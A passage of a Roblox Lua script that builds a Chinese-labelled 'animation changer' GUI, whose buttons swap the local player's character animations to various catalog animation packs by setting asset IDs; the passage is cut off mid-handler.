local A_Cartoony = Instance.new("TextButton")
local A_Elder = Instance.new("TextButton")
local A_Knight = Instance.new("TextButton")
local A_Levitation = Instance.new("TextButton")
local A_Mage = Instance.new("TextButton")
local A_Ninja = Instance.new("TextButton")
local A_Pirate = Instance.new("TextButton")
local A_Robot = Instance.new("TextButton")
local A_Stylish = Instance.new("TextButton")
local A_SuperHero = Instance.new("TextButton")
local A_Toy = Instance.new("TextButton")
local A_Vampire = Instance.new("TextButton")
local A_Werewolf = Instance.new("TextButton")
local A_Zombie = Instance.new("TextButton")
local Category = Instance.new("TextLabel")
local SpecialTab = Instance.new("Frame")
local A_Patrol = Instance.new("TextButton")
local A_Confident = Instance.new("TextButton")
local A_Popstar = Instance.new("TextButton")
local A_Cowboy = Instance.new("TextButton")
local A_Ghost = Instance.new("TextButton")
local A_Sneaky = Instance.new("TextButton")
local A_Princess = Instance.new("TextButton")
local Category_2 = Instance.new("TextLabel")
local OtherTab = Instance.new("Frame")
local Category_3 = Instance.new("TextLabel")
local A_None = Instance.new("TextButton")
local A_Anthro = Instance.new("TextButton")
local Animate = game.Players.LocalPlayer.Character.Animate

AnimationChanger.Name = "AnimationChanger"
AnimationChanger.Parent = game:WaitForChild("CoreGui")
AnimationChanger.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Main.Name = "Main"
Main.Parent = AnimationChanger
Main.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
Main.BorderSizePixel = 0
Main.Position = UDim2.new(0.421999991, 0, -1, 0)
Main.Size = UDim2.new(0, 300, 0, 250)
Main.Active = true
Main.Draggable = true

TopBar.Name = "TopBar"
TopBar.Parent = Main
TopBar.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
TopBar.BorderSizePixel = 0
TopBar.Size = UDim2.new(0, 300, 0, 30)

Close.Name = "Close"
Close.Parent = TopBar
Close.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Close.BorderSizePixel = 0
Close.Position = UDim2.new(0.899999976, 0, 0, 0)
Close.Size = UDim2.new(0, 30, 0, 30)
Close.Font = Enum.Font.SciFi
Close.Text = "x"
Close.TextColor3 = Color3.new(1, 0, 0.0156863)
Close.TextSize = 20
Close.MouseButton1Click:Connect(function()
    wait(0.3)
    Main:TweenPosition(UDim2.new(0.421999991, 0, -1.28400004, 0))
    wait(3)
    AnimationChanger:Destroy()
end)

TextLabel.Parent = TopBar
TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel.BackgroundTransparency = 1
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0, 0, 0.600000024, 0)
TextLabel.Size = UDim2.new(0, 270, 0, 10)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "ato汉化"
TextLabel.TextColor3 = Color3.new(1, 1, 1)
TextLabel.TextSize = 15

TextLabel_2.Parent = TopBar
TextLabel_2.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel_2.BackgroundTransparency = 1
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(0, 0, -0.0266667679, 0)
TextLabel_2.Size = UDim2.new(0, 270, 0, 20)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "动作变化"
TextLabel_2.TextColor3 = Color3.new(1, 1, 1)
TextLabel_2.TextSize = 20

NormalTab.Name = "NormalTab"
NormalTab.Parent = Main
NormalTab.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
NormalTab.BackgroundTransparency = 1
NormalTab.BorderSizePixel = 0
NormalTab.Position = UDim2.new(0.5, 0, 0.119999997, 0)
NormalTab.Size = UDim2.new(0, 150, 0, 500)

A_Astronaut.Name = "A_Astronaut"
A_Astronaut.Parent = NormalTab
A_Astronaut.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
A_Astronaut.BorderSizePixel = 0
A_Astronaut.Position = UDim2.new(0, 0, 0.815764725, 0)
A_Astronaut.Size = UDim2.new(0, 150, 0, 30)
A_Astronaut.Font = Enum.Font.SciFi
A_Astronaut.Text = "宇航员"
A_Astronaut.TextColor3 = Color3.new(1, 1, 1)
A_Astronaut.TextSize = 20
A_Astronaut.MouseButton1Click:Connect(function()
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=891621366"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=891633237"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=891667138"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=891636393"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=891627522"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=891609353"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=891617961"
game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)

A_Bubbly.Name = "A_Bubbly"
A_Bubbly.Parent = NormalTab
A_Bubbly.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
A_Bubbly.BorderSizePixel = 0
A_Bubbly.Position = UDim2.new(0, 0, 0.349019617, 0)
A_Bubbly.Size = UDim2.new(0, 150, 0, 30)
A_Bubbly.Font = Enum.Font.SciFi
A_Bubbly.Text = "起泡"
A_Bubbly.TextColor3 = Color3.new(1, 1, 1)
A_Bubbly.TextSize = 20
A_Bubbly.MouseButton1Click:Connect(function()
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=910004836"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=910009958"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=910034870"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=910025107"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=910016857"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=910001910"
Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=910030921"
Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=910028158"
game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)

A_Cartoony.Name = "A_Cartoony"
A_Cartoony.Parent = NormalTab
A_Cartoony.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
A_Cartoony.BorderSizePixel = 0
A_Cartoony.Position = UDim2.new(0, 0, 0.407272667, 0)
A_Cartoony.Size = UDim2.new(0, 150, 0, 30)
A_Cartoony.Font = Enum.Font.SciFi
A_Cartoony.Text = "卡通化"
A_Cartoony.TextColor3 = Color3.new(1, 1, 1)
A_Cartoony.TextSize = 20
A_Cartoony.MouseButton1Click:Connect(function()
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=742637544"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=742638445"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=742640026"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=742638842"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=742637942"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=742636889"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=742637151"
game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)

A_Elder.Name = "A_Elder"
A_Elder.Parent = NormalTab
A_Elder.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
A_Elder.BorderSizePixel = 0
A_Elder.Position = UDim2.new(6.51925802e-09, 0, 0.636310041, 0)
A_Elder.Size = UDim2.new(0, 150, 0, 30)
A_Elder.Font = Enum.Font.SciFi
A_Elder.Text = "长老"
A_Elder.TextColor3 = Color3.new(1, 1, 1)
A_Elder.TextSize = 20
A_Elder.MouseButton1Click:Connect(function()
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=845397899"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=845400520"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=845403856"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=845386501"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=845398858"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=845392038"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=845396048"
game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)

A_Knight.Name = "A_Knight"
A_Knight.Parent = NormalTab
A_Knight.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
A_Knight.BorderSizePixel = 0
A_Knight.Position = UDim2.new(0, 0, 0.52352941, 0)
A_Knight.Size = UDim2.new(0, 150, 0, 30)
A_Knight.Font = Enum.Font.SciFi
A_Knight.Text = "骑士"
A_Knight.TextColor3 = Color3.new(1, 1, 1)
A_Knight.TextSize = 20
A_Knight.MouseButton1Click:Connect(function()
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=657595757"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=657568135"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=657552124"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=657564596"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=658409194"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=658360781"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=657600338"
game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)

A_Levitation.Name = "A_Levitation"
A_Levitation.Parent = NormalTab
A_Levitation.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
A_Levitation.BorderSizePixel = 0
A_Levitation.Position = UDim2.new(0, 0, 0.115472436, 0)
A_Levitation.Size = UDim2.new(0, 150, 0, 30)
A_Levitation.Font = Enum.Font.SciFi
A_Levitation.Text = "悬浮"
A_Levitation.TextColor3 = Color3.new(1, 1, 1)
A_Levitation.TextSize = 20
A_Levitation.MouseButton1Click:Connect(function()
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616010382"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616003713"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)

A_Mage.Name = "A_Mage"
A_Mage.Parent = NormalTab
A_Mage.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
A_Mage.BorderSizePixel = 0
A_Mage.Position = UDim2.new(0, 0, 0.696203232, 0)
A_Mage.Size = UDim2.new(0, 150, 0, 30)
A_Mage.Font = Enum.Font.SciFi
A_Mage.Text = "法师"
A_Mage.TextColor3 = Color3.new(1, 1, 1)
A_Mage.TextSize = 20
A_Mage.MouseButton1Click:Connect(function()
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=707742142"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=707855907"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=707897309"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=707861613"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=707853694"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=707826056"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=707829716"
game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)

A_Ninja.Name = "A_Ninja"
A_Ninja.Parent = NormalTab
A_Ninja.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
A_Ninja.BorderSizePixel = 0
A_Ninja.Position = UDim2.new(0, 0, 0.0597896464, 0)
A_Ninja.Size = UDim2.new(0, 150, 0, 30)
A_Ninja.Font = Enum.Font.SciFi
A_Ninja.Text = "忍者"
A_Ninja.TextColor3 = Color3.new(1, 1, 1)
A_Ninja.TextSize = 20
A_Ninja.MouseButton1Click:Connect(function()
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=656117400"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=656118341"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=656121766"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=656118852"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=656117878"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=656114359"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=656115606"
game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)

A_Pirate.Name = "A_Pirate"
A_Pirate.Parent = NormalTab
A_Pirate.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
A_Pirate.BorderSizePixel = 0
A_Pirate.Position = UDim2.new(-0.000333309174, 0, 0.874588311, 0)
A_Pirate.Size = UDim2.new(0, 150, 0, 30)
A_Pirate.Font = Enum.Font.SciFi
A_Pirate.Text = "海盗"
A_Pirate.TextColor3 = Color3.new(1, 1, 1)
A_Pirate.TextSize = 20
A_Pirate.MouseButton1Click:Connect(function()
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=750781874"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=750782770"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=750785693"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=750783738"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=750782230"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=750779899"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=750780242"
game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)

A_Robot.Name = "A_Robot"
A_Robot.Parent = NormalTab
A_Robot.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
A_Robot.BorderSizePixel = 0
A_Robot.Position = UDim2.new(0, 0, 0.291479498, 0)
A_Robot.Size = UDim2.new(0, 150, 0, 30)
A_Robot.Font = Enum.Font.SciFi
A_Robot.Text = "机器人"
A_Robot.TextColor3 = Color3.new(1, 1, 1)
A_Robot.TextSize = 20
A_Robot.MouseButton1Click:Connect(function()
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616088211"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616089559"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616095330"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616091570"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616090535"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616086039"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616087089"
game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)

A_Stylish.Name = "A_Stylish"
A_Stylish.Parent = NormalTab
A_Stylish.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
A_Stylish.BorderSizePixel = 0
A_Stylish.Position = UDim2.new(0, 0, 0.232816339, 0)
A_Stylish.Size = UDim2.new(0, 150, 0, 30)
A_Stylish.Font = Enum.Font.SciFi
A_Stylish.Text = "优雅"
A_Stylish.TextColor3 = Color3.new(1, 1, 1)
A_Stylish.TextSize = 20
A_Stylish.MouseButton1Click:Connect(function()
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616136790"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616138447"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616146177"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616140816"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616139451"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616133594"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616134815"
game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)

A_SuperHero.Name = "A_SuperHero"
A_SuperHero.Parent = NormalTab
A_SuperHero.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
A_SuperHero.BorderSizePixel = 0
A_SuperHero.Position = UDim2.new(0, 0, 0.464919746, 0)
A_SuperHero.Size = UDim2.new(0, 150, 0, 30)
A_SuperHero.Font = Enum.Font.SciFi
A_SuperHero.Text = "超级英雄"
A_SuperHero.TextColor3 = Color3.new(1, 1, 1)
A_SuperHero.TextSize = 20
A_SuperHero.MouseButton1Click:Connect(function()
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616111295"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616113536"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616122287"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616117076"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616115533"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616104706"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616108001"
game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)

A_Toy.Name = "A_Toy"
A_Toy.Parent = NormalTab
A_Toy.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
A_Toy.BorderSizePixel = 0
A_Toy.Position = UDim2.new(6.51925802e-09, 0, 0.756028414, 0)
A_Toy.Size = UDim2.new(0, 150, 0, 30)
A_Toy.Font = Enum.Font.SciFi
A_Toy.Text = "玩具"
A_Toy.TextColor3 = Color3.new(1, 1, 1)
A_Toy.TextSize = 20
A_Toy.MouseButton1Click:Connect(function()
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=782841498"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=782845736"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=782843345"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=782842708"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=782847020"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=782843869"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=782846423"
game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)

A_Vampire.Name = "A_Vampire"
A_Vampire.Parent = NormalTab
A_Vampire.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
A_Vampire.BorderSizePixel = 0
A_Vampire.Position = UDim2.new(0, 0, 0.934021354, 0)
A_Vampire.Size = UDim2.new(0, 150, 0, 30)
A_Vampire.Font = Enum.Font.SciFi
A_Vampire.Text = "吸血鬼"
A_Vampire.TextColor3 = Color3.new(1, 1, 1)
A_Vampire.TextSize = 20
A_Vampire.MouseButton1Click:Connect(function()
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083445855"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083450166"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083473930"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083462077"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083455352"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083439238"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083443587"
game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)

A_Werewolf.Name = "A_Werewolf"
A_Werewolf.Parent = NormalTab
A_Werewolf.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
A_Werewolf.BorderSizePixel = 0
A_Werewolf.Position = UDim2.new(-0.000333368778, 0, 0.174509808, 0)
A_Werewolf.Size = UDim2.new(0, 150, 0, 30)
A_Werewolf.Font = Enum.Font.SciFi
A_Werewolf.Text = "狼人"
A_Werewolf.TextColor3 = Color3.new(1, 1, 1)
A_Werewolf.TextSize = 20
A_Werewolf.MouseButton1Click:Connect(function()
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083195517"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083214717"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083178339"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083216690"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083218792"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083182000"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083189019"
game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)

A_Zombie.Name = "A_Zombie"
A_Zombie.Parent = NormalTab
A_Zombie.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
A_Zombie.BorderSizePixel = 0
A_Zombie.Position = UDim2.new(-1.1920929e-07, 0, 0.582352936, 0)
A_Zombie.Size = UDim2.new(0, 150, 0, 30)
A_Zombie.Font = Enum.Font.SciFi
A_Zombie.Text = "僵尸"
A_Zombie.TextColor3 = Color3.new(1, 1, 1)
A_Zombie.TextSize = 20
A_Zombie.MouseButton1Click:Connect(function()
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616158929"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616160636"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616168032"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616161997"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616156119"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616157476"
game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)

Category.Name = "Category"
Category.Parent = NormalTab
Category.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
Category.BorderSizePixel = 0
Category.Size = UDim2.new(0, 150, 0, 30)
Category.Text = "标准"
Category.TextColor3 = Color3.new(0, 0.835294, 1)
Category.TextSize = 14

SpecialTab.Name = "SpecialTab"
SpecialTab.Parent = Main
SpecialTab.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
SpecialTab.BackgroundTransparency = 1
SpecialTab.BorderSizePixel = 0
SpecialTab.Position = UDim2.new(0, 0, 0.119999997, 0)
SpecialTab.Size = UDim2.new(0, 150, 0, 230)

A_Patrol.Name = "A_Patrol"
A_Patrol.Parent = SpecialTab
A_Patrol.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
A_Patrol.BorderSizePixel = 0
A_Patrol.Position = UDim2.new(0, 0, 0.259960413, 0)
A_Patrol.Size = UDim2.new(0, 150, 0, 30)
A_Patrol.Font = Enum.Font.SciFi
A_Patrol.Text = "巡逻"
A_Patrol.TextColor3 = Color3.new(1, 1, 1)
A_Patrol.TextSize = 20
A_Patrol.MouseButton1Click:Connect(function()
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1149612882"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1150842221"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1151231493"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1150967949"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1148811837"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1148811837"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1148863382"
game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)

A_Confident.Name = "A_Confident"
A_Confident.Parent = SpecialTab
A_Confident.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
A_Confident.BorderSizePixel = 0
A_Confident.Position = UDim2.new(0, 0, 0.389248967, 0)
A_Confident.Size = UDim2.new(0, 150, 0, 30)
A_Confident.Font = Enum.Font.SciFi
A_Confident.Text = "自信的"
A_Confident.TextColor3 = Color3.new(1, 1, 1)
A_Confident.TextSize = 20
A_Confident.MouseButton1Click:Connect(function()
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1069977950"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1069987858"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1070017263"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1070001516"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1069984524"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1069946257"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1069973677"
game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)

A_Popstar.Name = "A_Popstar"
A_Popstar.Parent = SpecialTab
A_Popstar.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
A_Popstar.BorderSizePixel = 0
A_Popstar.Position = UDim2.new(0, 0, 0.130671918, 0)
A_Popstar.Size = UDim2.new(0, 150, 0, 30)
A_Popstar.Font = Enum.Font.SciFi
A_Popstar.Text = "明星"
A_Popstar.TextColor3 = Color3.new(1, 1, 1)
A_Popstar.TextSize = 20
A_Popstar.MouseButton1Click:Connect(function()
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1212900985"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1150842221"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1212980338"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1212980348"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1212954642"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1213044953"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1212900995"
game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)

A_Cowboy.Name = "A_Cowboy"
A_Cowboy.Parent = SpecialTab
A_Cowboy.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
A_Cowboy.BorderSizePixel = 0
A_Cowboy.Position = UDim2.new(0, 0, 0.772964239, 0)
A_Cowboy.Size = UDim2.new(0, 150, 0, 30)
A_Cowboy.Font = Enum.Font.SciFi
A_Cowboy.Text = "牛仔"
A_Cowboy.TextColor3 = Color3.new(1, 1, 1)
A_Cowboy.TextSize = 20
A_Cowboy.MouseButton1Click:Connect(function()
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1014390418"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1014398616"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1014421541"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1014401683"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1014394726"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1014380606"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1014384571"
game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)

A_Ghost.Name = "A_Ghost"
A_Ghost.Parent = SpecialTab
A_Ghost.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
A_Ghost.BorderSizePixel = 0
A_Ghost.Position = UDim2.new(0, 0, 0.900632322, 0)
A_Ghost.Size = UDim2.new(0, 150, 0, 30)
A_Ghost.Font = Enum.Font.SciFi
A_Ghost.Text = "鬼"
A_Ghost.TextColor3 = Color3.new(1, 1, 1)
A_Ghost.TextSize = 20
A_Ghost.MouseButton1Click:Connect(function()
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=616012453"
Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=616011509"
game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)

A_Sneaky.Name = "A_Sneaky"
A_Sneaky.Parent = SpecialTab
A_Sneaky.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
A_Sneaky.BorderSizePixel = 0
A_Sneaky.Position = UDim2.new(0, 0, 0.517628431, 0)
A_Sneaky.Size = UDim2.new(0, 150, 0, 30)
A_Sneaky.Font = Enum.Font.SciFi
A_Sneaky.Text = "偷偷摸摸"
A_Sneaky.TextColor3 = Color3.new(1, 1, 1)
A_Sneaky.TextSize = 20
A_Sneaky.MouseButton1Click:Connect(function()
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1132473842"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1132477671"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1132510133"
